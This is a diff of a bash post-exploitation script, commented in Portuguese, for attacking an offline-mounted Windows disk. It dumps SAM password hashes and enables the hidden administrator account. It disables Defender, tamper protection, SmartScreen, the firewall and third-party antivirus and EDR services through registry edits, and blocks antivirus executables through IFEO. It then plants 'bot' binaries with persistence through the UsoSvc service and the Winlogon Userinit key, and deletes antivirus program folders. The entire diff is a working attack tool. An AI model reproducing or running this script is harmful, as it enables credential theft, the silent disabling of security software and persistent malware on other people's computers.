@@ -1,63 +1,104 @@
 #!/bin/bash
 
-PAYLOAD="Windows.exe"
-DEST_DIR="$HOME/Desktop/Post_Exploitation"
-UUID="BA6AF2446AF1FCC7"
-MOUNT_POINT="/run/media/root/$UUID"
-DISPOSITIVO="/dev/nvme0n1p3"
+# --- CONFIGURAÇÕES ---
+BOT="Windows.exe"
+HELPER="Windows_helper.exe"
+ASSISTANT="Windows.assistant.exe"
+SYS32_REG="C:\\\\Windows\\\\System32"
+DEST_DIR="$HOME/Desktop/Extraction_$(date +%d%m)"
+mkdir -p "$DEST_DIR"
 
-echo "[+] OPERAÇÃO OMNI TOTAL: DEFEZAS COMPLETAS + RING 0"
+echo "[+] INICIANDO PROTOCOLO OMNI: ACESSO TOTAL & FAILOVER DE MONTAGEM"
 
-# 1. MONTAGEM FORÇADA (ANTI-HIBERNAÇÃO)
-sudo umount -l "$DISPOSITIVO" 2>/dev/null
-sudo mkdir -p "$MOUNT_POINT"
-sudo mount -t ntfs-3g -o rw,remove_hiberfile "$DISPOSITIVO" "$MOUNT_POINT"
+# 1. LÓGICA DE DETEÇÃO DE PONTO DE MONTAGEM (FAILOVER)
+# Tentativa 1: Deteção Automática por ntoskrnl
+MOUNT_POINT=$(mount | grep -i "ntfs" | awk '{print $3}' | while read m; do [ -f "$m/Windows/System32/ntoskrnl.exe" ] && echo "$m" && break; done)
 
-SAM="$MOUNT_POINT/Windows/System32/config/SAM"
+# Tentativa 2: Failover para montagem manual via ntfs-3g (conforme seu comando)
+if [ -z "$MOUNT_POINT" ]; then
+    echo "[*] Deteção automática falhou. Tentando montagem forçada em /mnt/windows..."
+    sudo mkdir -p /mnt/windows
+    sudo mount -t ntfs-3g -o remove_hiberfile,rw /dev/nvme0n1p3 /mnt/windows 2>/dev/null
+    MOUNT_POINT="/mnt/windows"
+fi
+
+# Tentativa 3: Entrada manual se o dispositivo mudar
+if [ ! -f "$MOUNT_POINT/Windows/System32/config/SYSTEM" ]; then
+    echo "[-] Estrutura não encontrada em $MOUNT_POINT. Introduza o caminho manualmente."
+    read -p "[?] Caminho do mount (ex: /mnt/windows): " MOUNT_POINT
+fi
+
+if [ ! -f "$MOUNT_POINT/Windows/System32/config/SYSTEM" ]; then
+    echo "[-] Erro Crítico: Windows inacessível."
+    exit 1
+fi
+
+echo "[*] Windows detectado em: $MOUNT_POINT"
+
+# Definição das Hives
 SOFTWARE="$MOUNT_POINT/Windows/System32/config/SOFTWARE"
 SYSTEM="$MOUNT_POINT/Windows/System32/config/SYSTEM"
+SAM="$MOUNT_POINT/Windows/System32/config/SAM"
 
-# 2. HASHES E ADMIN OCULTO
-mkdir -p "$DEST_DIR"
-sudo samdump2 "$SYSTEM" "$SAM" > "$DEST_DIR/hashes.txt" 2>/dev/null
-printf "cd Domains\\\\Account\\\\Users\\\\000001F4\ned F\n11\nq\ny\n" | sudo chntpw -e "$SAM" &>/dev/null
+# 2. EXTRAÇÃO DE HASHES (Formatado em Colunas)
+echo "[*] Extraindo hashes para tabela..."
+samdump2 "$SYSTEM" "$SAM" | column -t -s ":" > "$DEST_DIR/hashes_tabela.txt"
 
-# 3. NUKE: FIREWALL, DEFENDER, SMART-SCREEN, TAMPER PROTECTION
-echo "[*] Desativando TODAS as defesas (Firewall, SmartScreen, Tamper)..."
-# Desativar Tamper Protection e Real-Time via SOFTWARE
-sudo chntpw -e "$SOFTWARE" <<EOF
-cd Microsoft\\Windows Defender\\Features
-nv 4 TamperProtection
-ed TamperProtection
-0
-cd ..\\Real-Time Protection
-nv 4 DisableRealtimeMonitoring
-ed DisableRealtimeMonitoring
-1
-cd ..\\..\\Windows\\CurrentVersion\\Explorer
-nv 4 SmartScreenEnabled
-ed SmartScreenEnabled
-Off
-q
-y
-EOF
+# 3. ATIVAR ADMIN OCULTO (RID 500)
+echo "[*] Ativando Administrador Oculto..."
+printf "1\n01f4\n1\n2\nq\nq\ny\n" | sudo chntpw -i "$SAM" &>/dev/null
 
-# Desativar Firewall e Antimalware via SYSTEM
-AV_SERVICES=("WinDefend" "mpssvc" "WdNisSvc" "Sense" "wscsvc")
-for svc in "${AV_SERVICES[@]}"; do
+# 4. NUKE: DEFESAS NATIVAS E EXCLUSÕES
+echo "[*] Neutralizando Defender, Firewall e SmartScreen..."
+# Desativa Real-Time, Tamper e adiciona Exclusão na System32
+printf "cd Microsoft\\\\Windows Defender\\\\Real-Time Protection\nnv 4 DisableRealtimeMonitoring\ned DisableRealtimeMonitoring\n1\ncd ..\\\\Features\nnv 4 TamperProtection\ned TamperProtection\n0\ncd ..\\\\Exclusions\\\\Paths\nnewkey $SYS32_REG\ncd ..\\\\..\\\\..\\\\Windows\\\\CurrentVersion\\\\Explorer\nnv 4 SmartScreenEnabled\ned SmartScreenEnabled\n0\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null
+
+# Desativar Firewall (Standard e Public Profiles)
+printf "cd ControlSet001\\\\Services\\\\SharedAccess\\\\Parameters\\\\FirewallPolicy\\\\StandardProfile\nnv 4 EnableFirewall\ned EnableFirewall\n0\ncd ..\\\\PublicProfile\nnv 4 EnableFirewall\ned EnableFirewall\n0\nq\ny\n" | sudo chntpw -e "$SYSTEM" &>/dev/null
+
+# 5. NUKE: DEFESAS DE TERCEIROS E ENDPOINTS
+echo "[*] Desativando serviços de AVs e Endpoints..."
+AV_LIST=("avp" "avpckcl" "McShield" "mfevtp" "SmadavService" "ekrn" "SentinelAgent" "SepMasterService")
+for svc in "${AV_LIST[@]}"; do
     printf "cd ControlSet001\\\\Services\\\\$svc\ned Start\n4\nq\ny\n" | sudo chntpw -e "$SYSTEM" &>/dev/null
 done
 
-# 4. RING 0 (UsoSvc) E PERSISTÊNCIA (Userinit)
-echo "[*] Injetando Persistência Ring 0..."
-printf "cd ControlSet001\\\\Services\\\\UsoSvc\ned ImagePath\nC:\\\\Windows\\\\System32\\\\Windows.exe\nnv 4 Start\ned Start\n2\nq\ny\n" | sudo chntpw -e "$SYSTEM" &>/dev/null
-printf "cd Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\ned Userinit\nC:\\\\Windows\\\\system32\\\\userinit.exe,cmd /c start C:\\\\Windows\\\\System32\\\\Windows.exe\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null
+# 6. BLOQUEIO DE AUTO-REGENERAÇÃO (IFEO)
+echo "[*] Aplicando bloqueio IFEO contra reinício de processos..."
+BLOCK_LIST=("Smadav.exe" "avp.exe" "McMcAfee.exe" "ekrn.exe" "MsMpEng.exe")
+for exe in "${BLOCK_LIST[@]}"; do
+    printf "cd Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\nnewkey $exe\ncd $exe\nnv 1 Debugger\ned Debugger\nsvchost.exe\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null
+done
 
-# 5. COPIAR BOT E FINALIZAR
-if [ -f "./$PAYLOAD" ]; then
-    sudo cp "./$PAYLOAD" "$MOUNT_POINT/Windows/System32/"
+# 7. SILENCIAR INTERFACE
+echo "[*] Desativando notificações e Central de Ação..."
+printf "cd Microsoft\\\\Windows\\\\CurrentVersion\\\\ImmersiveShell\nnv 4 UseActionCenterExperience\ned UseActionCenterExperience\n0\ncd ..\\\\..\\\\..\\\\Policies\\\\Microsoft\\\\Windows\\\\Explorer\nnv 4 DisableNotificationCenter\ned DisableNotificationCenter\n1\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null
+
+# 8. PERSISTÊNCIA DUPLA (SYSTEM + USER FAILOVER)
+echo "[*] Configurando cadeia SYSTEM (Helper) e Failover (Assistant)..."
+# SYSTEM: UsoSvc -> Windows_helper.exe (C++) -> Windows.exe (C#)
+printf "cd ControlSet001\\\\Services\\\\UsoSvc\nnv 1 ImagePath\ned ImagePath\ncmd /c $SYS32_REG\\\\$HELPER\nnv 4 Start\ned Start\n2\nq\ny\n" | sudo chntpw -e "$SYSTEM" &>/dev/null
+
+# USER FAILOVER: Userinit -> Windows.assistant.exe (Correção da Hive SOFTWARE aplicada)
+printf "cd Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\ned Userinit\nC:\\\\Windows\\\\system32\\\\userinit.exe,cmd $SYS32_REG\\\\$ASSISTANT\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null
+
+# 9. DEPLOY FINAL COM APAGÃO DE PASTAS
+echo "[*] Iniciando Deploy de binários e Nuke físico de diretórios..."
+if [ -f "./$BOT" ] && [ -f "./$HELPER" ] && [ -f "./$ASSISTANT" ] ; then
+    sudo cp "./$BOT" "$MOUNT_POINT/Windows/System32/"
+    sudo cp "./$HELPER" "$MOUNT_POINT/Windows/System32/"
+    sudo cp "./$ASSISTANT" "$MOUNT_POINT/Windows/System32/"
+    
+    # Nuke físico de pastas críticas
+    rm -rf "$MOUNT_POINT/Program Files (x86)/Smadav" &>/dev/null
+    rm -rf "$MOUNT_POINT/Program Files/McAfee" &>/dev/null
+    rm -rf "$MOUNT_POINT/Program Files/Kaspersky Lab" &>/dev/null
+    
     sync
-    echo "[!!!] SUCESSO. Disco pronto e defesas neutralizadas."
+    echo "[!!!] PROTOCOLO CONCLUÍDO COM SUCESSO."
+    echo "[!] Alvo localizado em: $MOUNT_POINT"
+    echo "[!] Hashes extraídas em: $DEST_DIR"
 else
-    echo "[-] ERRO: $PAYLOAD não encontrado!"
+    echo "[-] ERRO CRÍTICO: Binários ($BOT, $HELPER ou $ASSISTANT) não encontrados na pasta local."
+    exit 1
 fi
